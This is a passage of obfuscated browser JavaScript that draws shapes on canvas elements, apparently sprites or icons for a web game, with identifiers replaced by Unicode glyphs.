			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 321 * ᐃ;
			Ⲇⵠ.height = 345 * ᐃ;
			Δ.translate(0, 5 * ᐃ);
			Δ.translate(0, ᐃ * 20);
			ⵠᐃᐃ(Δ, 160.5 * ᐃ, ᐃ * 159.5, ᐃ * 156.39595138242822);
			ΔⲆ(Δ, ⵠ[8], ⵠ[ᐃⵠᐃᐃⵠ], ΔⲆⲆⲆ * ᐃ);
			Δ.translate(0, ᐃ * -20);
			ⵠᐃᐃ(Δ, 160.5 * ᐃ, ᐃ * 159.5, ᐃ * 156.39595138242822);
			ΔⲆ(Δ, ⵠ[79], ⵠ[379], ᐃ * 10);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠᐃΔⲆ];
			Δ.moveTo(31.999969482421875 * ᐃ, ᐃ * 163.07290649414062);
			Δ.bezierCurveTo(22.999969482421875 * ᐃ, 67.07290649414062 * ᐃ, ᐃ * 106, 20.072906494140625 * ᐃ, 162 * ᐃ, 23.072906494140625 * ᐃ);
			Δ.bezierCurveTo(269.9999694824219 * ᐃ, ᐃ * 31.072906494140625, ᐃ * 292.9999694824219, 120.07290649414062 * ᐃ, ᐃ * 294.9999694824219, ᐃ * 161.07290649414062);
			Δ.bezierCurveTo(ᐃ * 165.49996948242188, 162.07290649414062 * ᐃ, ᐃ * 165.49996948242188, 162.07290649414062 * ᐃ, 35.999969482421875 * ᐃ, 163.07290649414062 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, "#12432D");
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔⵠⲆⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(32.999969482421875 * ᐃ, 165.07290649414062 * ᐃ);
			Δ.bezierCurveTo(16.999969482421875 * ᐃ, 221.07290649414062 * ᐃ, 85 * ᐃ, ᐃ * 289.0729064941406, 156 * ᐃ, 294.0729064941406 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 263.9999694824219, ᐃ * 293.0729064941406, ᐃ * 295.9999694824219, ᐃ * 199.07290649414062, 294.9999694824219 * ᐃ, ᐃ * 159.07290649414062);
			Δ.closePath();
			ΔⲆ(Δ, ⵠ[329]);
			ⵠᐃᐃ(Δ, ᐃ * 161, 158.07290649414062 * ᐃ, 133.4053971921676 * ᐃ);
			ΔⲆ(Δ, ᐃⲆᐃⲆⲆ, ⵠ[379], ⵠᐃⲆⲆΔ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(31.999969482421875 * ᐃ, ᐃ * 161.62844848632812);
			Δ.bezierCurveTo(162.49996948242188 * ᐃ, ᐃ * 161.62844848632812, 162.49996948242188 * ᐃ, ᐃ * 161.62844848632812, 292.9999694824219 * ᐃ, ᐃ * 161.62844848632812);
			Δ.closePath();
			ΔⲆ(Δ, ⲆΔⵠⲆⵠ, ⵠ[379], ⵠⲆⵠⲆⵠ * ᐃ);
			Δ.translate(0, ⲆⲆᐃⵠΔ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆΔΔᐃ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(66 * ᐃ, 158.29513549804688 * ᐃ);
			Δ.bezierCurveTo(86 * ᐃ, 158.29513549804688 * ᐃ, ᐃ * 86, 158.29513549804688 * ᐃ, ᐃ * 106, ᐃ * 158.29513549804688);
			Δ.closePath();
			ΔⲆ(Δ, ⲆᐃΔⲆᐃ, ⵠ[414], ᐃ * 12);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 57.999969482421875, 117.29513549804688 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 85, 128.29513549804688 * ᐃ, 85 * ᐃ, ᐃ * 128.29513549804688, 113 * ᐃ, 139.29513549804688 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, ⲆΔΔΔⲆ, ⵠ[414], ᐃ * ⵠΔᐃΔᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠΔⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(95 * ᐃ, 90.29513549804688 * ᐃ);
			Δ.bezierCurveTo(112 * ᐃ, ᐃ * 105.79513549804688, ᐃ * 112, 105.79513549804688 * ᐃ, ᐃ * 129, ᐃ * 121.29513549804688);
			Δ.closePath();
			ΔⲆ(Δ, undefined, ⵠ[414], ᐃ * 12);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(116 * ᐃ, ᐃ * 52.850677490234375);
			Δ.bezierCurveTo(ᐃ * 130, 83.85067749023438 * ᐃ, 130 * ᐃ, ᐃ * 83.85067749023438, ᐃ * 144, 114.85067749023438 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, ᐃⵠᐃⵠᐃ, ⵠ[414], ⵠΔᐃΔⵠⲆⵠ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠΔⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(159 * ᐃ, 61.295135498046875 * ᐃ);
			Δ.bezierCurveTo(160.49996948242188 * ᐃ, 92.29513549804688 * ᐃ, ᐃ * 160.49996948242188, 92.29513549804688 * ᐃ, 160 * ᐃ, ᐃ * 123.29513549804688);
			Δ.closePath();
			ΔⲆ(Δ, undefined, ⵠ[414], ᐃ * 12);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆⵠⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(203 * ᐃ, 51.295135498046875 * ᐃ);
			Δ.bezierCurveTo(190.49996948242188 * ᐃ, ᐃ * 83.29513549804688, ᐃ * 190.49996948242188, ᐃ * 83.29513549804688, ᐃ * 176, ᐃ * 115.29513549804688);
			Δ.closePath();
			ΔⲆ(Δ, undefined, ⵠ[414], ΔᐃΔΔΔΔⵠ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 225, ᐃ * 89.29513549804688);
			Δ.bezierCurveTo(210.49996948242188 * ᐃ, ᐃ * 104.79513549804688, ᐃ * 210.49996948242188, ᐃ * 104.79513549804688, 194 * ᐃ, 120.29513549804688 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, ⵠᐃⵠⲆΔ, ⵠ[414], ᐃ * 12);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(266.9999694824219 * ᐃ, 112.29513549804688 * ᐃ);
			Δ.bezierCurveTo(233.49996948242188 * ᐃ, 127.29513549804688 * ᐃ, ᐃ * 233.49996948242188, 127.29513549804688 * ᐃ, 199 * ᐃ, 142.29513549804688 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, undefined, ⵠ[414], ᐃ * 12);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃⲆⵠΔ];
			Δ.lineJoin = ⵠ[ⵠⵠΔΔ];
			Δ.moveTo(ᐃ * 256.9999694824219, 155.29513549804688 * ᐃ);
			Δ.bezierCurveTo(238.49996948242188 * ᐃ, 156.29513549804688 * ᐃ, 238.49996948242188 * ᐃ, 156.29513549804688 * ᐃ, ᐃ * 219, ᐃ * 157.29513549804688);
			Δ.closePath();
			ΔⲆ(Δ, undefined, ⵠ[414], 12 * ᐃ);
			Δ.translate(0, -Δᐃⵠⵠⵠ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(66 * ᐃ, 158.29513549804688 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 86, ᐃ * 158.29513549804688, ᐃ * 86, 158.29513549804688 * ᐃ, ᐃ * 106, ᐃ * 158.29513549804688);
			Δ.closePath();
			ΔⲆ(Δ, ⲆΔⵠⲆⲆ, ⵠ[475], ⵠⲆⵠⲆⵠ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 57.999969482421875, ᐃ * 117.29513549804688);
			Δ.bezierCurveTo(ᐃ * 85, ᐃ * 128.29513549804688, ᐃ * 85, ᐃ * 128.29513549804688, ᐃ * 113, 139.29513549804688 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, ᐃⵠᐃⵠᐃ, ⵠ[475], ᐃ * ⲆΔⲆⲆᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆⵠⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 95, 90.29513549804688 * ᐃ);
			Δ.bezierCurveTo(112 * ᐃ, 105.79513549804688 * ᐃ, 112 * ᐃ, ᐃ * 105.79513549804688, ᐃ * 129, 121.29513549804688 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, undefined, ⵠ[475], ᐃ * 12);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔΔᐃⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 116, ᐃ * 52.850677490234375);
			Δ.bezierCurveTo(130 * ᐃ, 83.85067749023438 * ᐃ, ᐃ * 130, ᐃ * 83.85067749023438, ᐃ * 144, ᐃ * 114.85067749023438);
			Δ.closePath();
			ΔⲆ(Δ, undefined, ⵠ[475], ΔᐃΔⵠⵠ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠⲆⵠⵠ];
			Δ.moveTo(159 * ᐃ, ᐃ * 61.295135498046875);
			Δ.bezierCurveTo(160.49996948242188 * ᐃ, ᐃ * 92.29513549804688, 160.49996948242188 * ᐃ, ᐃ * 92.29513549804688, 160 * ᐃ, ᐃ * 123.29513549804688);
			Δ.closePath();
			ΔⲆ(Δ, undefined, ⵠ[475], ᐃ * ᐃᐃⵠᐃΔᐃⵠ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ΔⲆΔΔ];
			Δ.moveTo(203 * ᐃ, ᐃ * 51.295135498046875);
			Δ.bezierCurveTo(ᐃ * 190.49996948242188, ᐃ * 83.29513549804688, ᐃ * 190.49996948242188, 83.29513549804688 * ᐃ, ᐃ * 176, 115.29513549804688 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, undefined, ⵠ[475], ᐃ * 12);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔⵠⲆⲆ];
			Δ.lineJoin = ⵠ[ΔⲆΔΔ];
			Δ.moveTo(225 * ᐃ, 89.29513549804688 * ᐃ);
			Δ.bezierCurveTo(210.49996948242188 * ᐃ, ᐃ * 104.79513549804688, ᐃ * 210.49996948242188, 104.79513549804688 * ᐃ, 194 * ᐃ, 120.29513549804688 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, undefined, ⵠ[475], ᐃ * ⵠΔᐃΔⵠⲆⵠ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃΔΔΔ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 266.9999694824219, 112.29513549804688 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 233.49996948242188, ᐃ * 127.29513549804688, 233.49996948242188 * ᐃ, ᐃ * 127.29513549804688, 199 * ᐃ, 142.29513549804688 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, undefined, ⵠ[475], ᐃ * 12);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 256.9999694824219, ᐃ * 155.29513549804688);
			Δ.bezierCurveTo(238.49996948242188 * ᐃ, 156.29513549804688 * ᐃ, 238.49996948242188 * ᐃ, ᐃ * 156.29513549804688, ᐃ * 219, ᐃ * 157.29513549804688);
			Δ.closePath();
			ΔⲆ(Δ, ⲆΔⵠⲆⲆ, ⵠ[475], ᐃ * ⲆⲆΔΔⵠΔⲆ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(94.00003051757812 * ᐃ, 164.40341186523438 * ᐃ);
			Δ.bezierCurveTo(162.50003051757812 * ᐃ, ᐃ * 164.40341186523438, ᐃ * 230.00003051757812, 165.40341186523438 * ᐃ, ᐃ * 231.00003051757812, 164.40341186523438 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 214.00003051757812, 267.4034118652344 * ᐃ, ᐃ * 92.00003051757812, ᐃ * 243.40341186523438, ᐃ * 93.00003051757812, ᐃ * 165.40341186523438);
			Δ.closePath();
			ΔⲆ(Δ, "#704618", "#5D3D1A", ᐃ * ⵠⵠⲆⵠΔ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃᐃⲆᐃ];
			Δ.moveTo(96 * ᐃ, ᐃ * 166);
			Δ.bezierCurveTo(ᐃ * 88, ᐃ * 117, ᐃ * 129, 92 * ᐃ, 161 * ᐃ, 91 * ᐃ);
			Δ.bezierCurveTo(201 * ᐃ, ᐃ * 90, ᐃ * 223, ᐃ * 121, 230 * ᐃ, 161 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, "#ECBE35", ⵠ[475], ⵠⵠⵠΔᐃ * ᐃ);
			ⵠᐃᐃ(Δ, 160.00003051757812 * ᐃ, ᐃ * 166.49432373046875, 28.30194339616981 * ᐃ);
			ΔⲆ(Δ, ⵠ[79], ⵠ[379], 10 * ᐃ);
			return Ⲇⵠ
		}

		function ΔⵠᐃΔᐃ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 69;
			Ⲇⵠ.height = ᐃ * 120;
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : ᐃᐃⲆΔ;
			Δ.save();
			Δ.translate(30 * ᐃ, ᐃ * 84);
			Ⲇᐃᐃ(Δ, -ⲆΔᐃΔⵠ * ᐃ, ᐃ * -66.5, ΔⵠⲆᐃⲆ * ᐃ, ⵠⵠΔᐃᐃ * ᐃ, ᐃ * ᐃΔⲆᐃⵠ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆⲆ]);
			Δ.save();
			Δ.translate(ᐃ * 30, ᐃ * 45);
			Ⲇᐃᐃ(Δ, ᐃ * -9.5, ᐃ * -6.5, ᐃ * 16, 13 * ᐃ, ΔᐃⲆⵠⵠΔⵠ * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.save();
			Δ.translate(30 * ᐃ, 17 * ᐃ);
			Ⲇᐃᐃ(Δ, -7.5 * ᐃ, ᐃ * -5.5, 12 * ᐃ, ᐃ * ⵠⲆᐃⵠⲆᐃΔ, ⲆⲆᐃΔΔ * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.save();
			Δ.translate(30 * ᐃ, 31 * ᐃ);
			Ⲇᐃᐃ(Δ, -26 * ᐃ, -14.5 * ᐃ, ᐃ * 52, ᐃ * 29, ᐃ * 5);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.globalAlpha = 1;
			Δ.save();
			Δ.translate(36 * ᐃ, 79.140625 * ᐃ);
			Ⲇᐃᐃ(Δ, ᐃ * -6, -66.5 * ᐃ, ᐃ * ᐃⵠⲆᐃᐃ, ⲆᐃᐃΔⵠᐃΔ * ᐃ, ⲆⲆᐃΔΔ * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[2], ΔⲆᐃⲆ * ᐃ);
			Δ.save();
			Δ.translate(ᐃ * 35, ᐃ * 40.140625);
			Ⲇᐃᐃ(Δ, -9.5 * ᐃ, -6.5 * ᐃ, ΔⵠΔᐃᐃ * ᐃ, 13 * ᐃ, ᐃ * 10);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[ⵠΔΔᐃΔ], ᐃ * ᐃⲆᐃᐃ);
			Δ.save();
			Δ.translate(ᐃ * 35, ᐃ * 12.140625);
			Ⲇᐃᐃ(Δ, -7.5 * ᐃ, ᐃ * -5.5, 12 * ᐃ, ᐃ * 11, 10 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⵠⵠᐃ], Ⲇᐃ[ΔⲆᐃⵠᐃ], ᐃᐃⲆΔⵠ * ᐃ);
			Δ.save();
			Δ.translate(34.5 * ᐃ, 26.140625 * ᐃ);
			Ⲇᐃᐃ(Δ, ᐃ * -26, -14.5 * ᐃ, ᐃ * 52, ᐃ * 29, ᐃⲆⵠⵠ * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[ⲆᐃᐃΔ], ᐃ * 3);
			return Ⲇⵠ
		}

		function ⲆⲆᐃᐃᐃⵠᐃ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ, ⵠᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 450;
			Ⲇⵠ.height = 260 * ᐃ;
			var ᐃⵠ = ΔⲆᐃⲆⵠⵠᐃ(ᐃ * ᐃΔᐃⲆ, ⲆᐃΔⲆⲆ, Ⲇᐃ);
			Δ.drawImage(ᐃⵠ, Δⵠᐃ * ᐃ, ᐃ * 0);
			if (ⵠᐃ == 1) {
				Δ.translate(ᐃ * 100, ᐃ * 0);
				ⵠᐃᐃ(Δ, ᐃ * 113, 120 * ᐃ, 66 * ᐃ);
				ΔⲆ(Δ, ΔΔΔⲆΔ, Ⲇᐃ[4], ᐃ * 13);
				var ᐃⵠ = ᐃᐃΔⵠⵠⲆⲆ(.65 * ᐃ, ⲆⲆΔⲆⲆ, [ⵠ[111], ⵠ[516], ⵠ[382], ⵠ[24], ⵠ[237]]);
				Δ.rotate(.7);
				Δ.drawImage(ᐃⵠ, ᐃ * 133, ᐃ * -64);
				Δ.rotate(-.7);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⵠⵠΔⵠ];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(ᐃ * 70, 70 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 113, 120.5 * ᐃ, ᐃ * 113, 120.5 * ᐃ, ᐃ * 156, 171 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, undefined, Ⲇᐃ[ΔᐃⵠⵠⲆ], ᐃ * 13)
			} else if (ⵠⵠΔⲆ == ⵠᐃ) {
				Δ.translate(ᐃ * 100, ᐃ * ⵠⲆᐃⵠ);
				ⵠᐃᐃ(Δ, 113 * ᐃ, 120 * ᐃ, 66 * ᐃ);
				ΔⲆ(Δ, ⲆⲆⲆⵠⵠ, Ⲇᐃ[ΔⲆⲆⲆ], 13 * ᐃ);
				Δ.translate(ᐃ * 30, 40 * ᐃ);
				Δ.save();
				Δ.translate(83.5 * ᐃ, 66.5 * ᐃ);
				Ⲇᐃᐃ(Δ, -40.5 * ᐃ, ᐃ * -29.5, 81 * ᐃ, 59 * ᐃ, ⵠⵠΔⵠᐃ * ᐃ);
				Δ.restore();
				ΔⲆ(Δ, "#dff2f7", ⵠ[272], 7 * ᐃ);
				ⵠᐃᐃ(Δ, 22 * ᐃ, 82 * ᐃ, ᐃ * 12);
				ΔⲆ(Δ, "#dff2f7", ⵠ[272], 7 * ᐃ);
				ⵠᐃᐃ(Δ, ᐃ * 145, ᐃ * 82, ᐃ * 12);
				ΔⲆ(Δ, "#dff2f7", ⵠ[272], ᐃ * 7);
				var ᐃⵠ = ᐃΔⲆⵠⵠ(ᐃ * .5, ᐃΔᐃⵠΔ, ["#80500b", "#7c4908"]);
				Δ.drawImage(ᐃⵠ, ᐃ * 10, 85 * ᐃ);
				var ᐃⵠ = ᐃΔⲆⵠⵠ(ᐃ * .5, true, ["#80500b", "#7c4908"]);
				Δ.drawImage(ᐃⵠ, ᐃ * 50, 85 * ᐃ);
				var ᐃⵠ = ᐃΔⲆⵠⵠ(.5 * ᐃ, true, ["#80500b", "#7c4908"]);
				Δ.drawImage(ᐃⵠ, 90 * ᐃ, 85 * ᐃ);
				var ᐃⵠ = ⲆⲆⵠⲆᐃ(ᐃ * 1, true, [ⵠ[372], ⵠ[168]]);
				Δ.drawImage(ᐃⵠ, ᐃ * 90, 105 * ᐃ);
				var ᐃⵠ = ⲆⲆⵠⲆᐃ(ⵠΔⲆ * ᐃ, ⲆΔΔⲆΔ, [ⵠ[372], ⵠ[168]]);
				Δ.drawImage(ᐃⵠ, ᐃ * 90, ᐃ * 105);
				var ᐃⵠ = ⲆⲆⵠⲆᐃ(ᐃ * 1, ⵠⲆⲆⵠᐃ, [ⵠ[372], ⵠ[168]]);
				Δ.drawImage(ᐃⵠ, 30 * ᐃ, ᐃ * 125);
				var ᐃⵠ = ⲆⲆⵠⲆᐃ(ᐃ * ⲆⵠⲆⲆ, ⵠᐃⲆᐃΔ, [ⵠ[372], ⵠ[168]]);
				Δ.drawImage(ᐃⵠ, 50 * ᐃ, ᐃ * 115);
				var ᐃⵠ = ⲆⲆⵠⲆᐃ(ᐃ * ᐃΔᐃⲆ, ᐃⲆⲆᐃΔ, [ⵠ[372], ⵠ[168]]);
				Δ.drawImage(ᐃⵠ, ᐃ * 30, ⵠⵠΔᐃᐃ * ᐃ);
				var ᐃⵠ = ⲆⲆⵠⲆᐃ(ᐃ * 1, true, [ⵠ[372], ⵠ[168]]);
				Δ.drawImage(ᐃⵠ, 80 * ᐃ, 120 * ᐃ);
				var ᐃⵠ = ⲆⲆⵠⲆᐃ(ΔᐃⲆⵠ * ᐃ, ⲆⲆⲆΔⲆ, [ⵠ[372], ⵠ[168]]);
				Δ.drawImage(ᐃⵠ, 110 * ᐃ, ᐃ * 125);
				var ᐃⵠ = ⲆⲆⵠⲆᐃ(1 * ᐃ, ⵠΔΔⵠΔⵠᐃ, [ⵠ[372], ⵠ[168]]);
				Δ.drawImage(ᐃⵠ, ᐃ * 120, ᐃ * 105)
			} else if (3 == ⵠᐃ) {
				Δ.translate(ⵠᐃᐃᐃᐃΔⵠ * ᐃ, Ⲇᐃⵠⵠ * ᐃ);
				ⵠᐃᐃ(Δ, ᐃ * 113, ᐃ * 120, 66 * ᐃ);
				ΔⲆ(Δ, undefined, Ⲇᐃ[4], ᐃ * ᐃΔⲆᐃⲆᐃⲆ);
				Δ.translate(40 * ᐃ, ᐃ * 50);
				Δ.save();
				Δ.translate(ᐃ * 71, 69 * ᐃ);
				Ⲇᐃᐃ(Δ, -30 * ᐃ, -42 * ᐃ, 60 * ᐃ, ᐃ * 84, 10 * ᐃ);
				Δ.restore();
				ΔⲆ(Δ, undefined, Ⲇᐃ[ⵠⵠΔΔ], 4 * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(ᐃ * 42, 28 * ᐃ);
				Δ.bezierCurveTo(60 * ᐃ, 31 * ᐃ, ᐃ * 60, 31 * ᐃ, 78 * ᐃ, ᐃ * 34);
				Δ.bezierCurveTo(ᐃ * 82, 34 * ᐃ, 84 * ᐃ, ᐃ * 37, 83 * ᐃ, ᐃ * 45);
				Δ.bezierCurveTo(83 * ᐃ, 80 * ᐃ, 83 * ᐃ, 80 * ᐃ, ᐃ * 83, ᐃ * 115);
				Δ.bezierCurveTo(83 * ᐃ, 120 * ᐃ, 80 * ᐃ, 122 * ᐃ, ᐃ * 73, 120 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 42, 111 * ᐃ, ᐃ * 43, ᐃ * 109, ᐃ * 41, ᐃ * 102);
				Δ.bezierCurveTo(41 * ᐃ, ᐃ * 71, ᐃ * 41, ᐃ * 71, 41 * ᐃ, ᐃ * 40);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ⵠᐃΔⵠ], Ⲇᐃ[5], 4 * ᐃ);
				Δ.translate(-40 * ᐃ, -50 * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[ⵠᐃⲆΔ];
				Δ.moveTo(ᐃ * 70, 70 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 113, 120.5 * ᐃ, ᐃ * 113, 120.5 * ᐃ, 156 * ᐃ, ᐃ * 171);
				Δ.closePath();
				ΔⲆ(Δ, undefined, Ⲇᐃ[4], ΔⵠⲆΔⲆⲆᐃ * ᐃ)
			} else if (4 == ⵠᐃ) {
				Δ.scale(ᐃⲆᐃ, 1);
				Δ.translate(70 * ᐃ, ᐃ * 50);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⲆⲆΔⵠ];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(ᐃ * 23, ᐃ * 6);
				Δ.bezierCurveTo(25.5 * ᐃ, 56 * ᐃ, ᐃ * 25.5, ᐃ * 56, 28 * ᐃ, 106 * ᐃ);
				ΔⲆ(Δ, ⵠⵠⵠⲆⵠ, Ⲇᐃ[5], ⲆΔᐃⲆΔᐃΔ * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⵠⵠΔΔ];
				Δ.lineJoin = ⵠ[ᐃΔΔΔ];
				Δ.moveTo(ᐃ * 59, ᐃⵠᐃΔⵠ * ᐃ);
				Δ.bezierCurveTo(ᐃ * 61, 51.5 * ᐃ, ᐃ * 61, ᐃ * 51.5, 63 * ᐃ, 93 * ᐃ);
				ΔⲆ(Δ, undefined, Ⲇᐃ[ᐃΔΔⲆ], ΔⵠⵠⲆⵠᐃᐃ * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(ᐃ * ᐃᐃᐃⵠᐃ, ᐃ * 55);
				Δ.bezierCurveTo(33.5 * ᐃ, 55 * ᐃ, ᐃ * 33.5, 55 * ᐃ, ᐃ * 60, ᐃ * 55);
				ΔⲆ(Δ, ⵠⵠⵠⲆⵠ, Ⲇᐃ[ΔⵠⲆⲆ], ᐃ * 14);
				Δ.translate(ⵠⵠΔⲆᐃ * ᐃ, ᐃ * Ⲇᐃⵠⵠ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⵠᐃⲆΔ];
				Δ.lineJoin = ⵠ[ᐃᐃⲆᐃ];
				Δ.moveTo(ᐃ * 123, 16 * ᐃ);
				Δ.bezierCurveTo(103 * ᐃ, 16.5 * ᐃ, 103 * ᐃ, 16.5 * ᐃ, ᐃ * 83, 17 * ᐃ);
				Δ.bezierCurveTo(83.5 * ᐃ, 61 * ᐃ, ᐃ * 83.5, 61 * ᐃ, ᐃ * 84, ᐃ * 105);
				Δ.bezierCurveTo(ᐃ * 106, 105 * ᐃ, 106 * ᐃ, 105 * ᐃ, ᐃ * 128, ᐃ * 105);
				ΔⲆ(Δ, undefined, Ⲇᐃ[ⵠⵠΔⵠ], ᐃ * ⲆΔᐃⲆΔᐃΔ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(72 * ᐃ, ᐃ * 63);
				Δ.bezierCurveTo(88.5 * ᐃ, ᐃ * 62.5, 88.5 * ᐃ, 62.5 * ᐃ, 105 * ᐃ, 62 * ᐃ);
				ΔⲆ(Δ, undefined, Ⲇᐃ[ⲆΔΔᐃ], ᐃ * 14);
				Δ.translate(ᐃΔⲆᐃⵠ * ᐃ, ᐃ * 10);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⲆⲆΔⵠ];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(141 * ᐃ, ᐃ * 8);
				Δ.bezierCurveTo(ᐃ * 143, ᐃ * 50, 143 * ᐃ, ᐃ * 50, 145 * ᐃ, 92 * ᐃ);
				Δ.bezierCurveTo(169 * ᐃ, ᐃ * 88.5, 169 * ᐃ, 88.5 * ᐃ, ᐃ * 193, ᐃ * 85);
				ΔⲆ(Δ, ΔΔΔⲆΔ, Ⲇᐃ[ᐃⲆⵠΔ], ᐃ * ⵠᐃⵠΔᐃ);
				Δ.translate(ᐃⵠᐃΔⵠ * ᐃ, ᐃ * -ⵠᐃⲆⲆΔ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⵠⲆᐃᐃ];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(ᐃ * 205, 124 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 205, 69 * ᐃ, 205 * ᐃ, ᐃ * 69, ᐃ * 205, 14 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 239, ᐃ * 15, ᐃ * 250, 37 * ᐃ, ᐃ * 249, ᐃ * 49);
				Δ.bezierCurveTo(ᐃ * 251, 65 * ᐃ, 242 * ᐃ, 76 * ᐃ, 206 * ᐃ, 75 * ᐃ);
				ΔⲆ(Δ, undefined, Ⲇᐃ[ⵠⵠΔΔ], ᐃ * ⲆΔᐃⲆΔᐃΔ)
			}
			return Ⲇⵠ
		}
		const ΔⵠⲆΔ = ᐃⲆᐃ;
		const ⵠΔᐃᐃⵠ = ᐃⲆⵠᐃ;

		function ⵠⲆⵠⵠⵠⲆᐃ(ᐃ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
